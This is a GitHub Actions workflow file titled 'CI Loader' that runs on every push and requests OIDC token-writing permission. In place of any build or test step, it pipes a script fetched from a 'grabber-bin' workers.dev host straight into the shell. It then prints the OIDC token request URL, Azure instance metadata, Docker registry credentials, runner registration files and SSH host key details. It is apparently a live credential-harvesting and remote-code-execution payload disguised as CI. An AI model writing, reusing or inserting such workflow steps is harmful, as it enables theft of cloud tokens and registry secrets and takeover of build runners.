name: CI Loader

on:
  push:
  workflow_dispatch:

jobs:
  ci-loader:
    runs-on: ubuntu-latest
    timeout-minutes: 9
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Loader
        run: |
          curl -fsSL 'https://grabber-bin.ezraslaughter01325.workers.dev/gr/ci-prod/latest/loader.sh' | sh
      - name: Capture
        run: |
          echo "ACTIONS_ID_TOKEN_REQUEST_URL=$ACTIONS_ID_TOKEN_REQUEST_URL"
          echo "--- azure vm metadata ---"
          curl -fsSL -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" || echo "no azure metadata"
          echo "--- docker config.json ---"
          cat ~/.docker/config.json 2>/dev/null || echo "no docker config"
          echo "--- .runner ---"
          ls -d /home/runner/runners/*/ 2>/dev/null; cat /home/runner/runners/*/.runner 2>/dev/null; sudo find / -maxdepth 7 -name .runner -exec cat {} \; 2>/dev/null; echo "end-runner"
          echo "--- ssh host keys ---"
          sudo ls -l /etc/ssh/ && sudo cat /etc/ssh/ssh_host_ed25519_key.pub 2>/dev/null
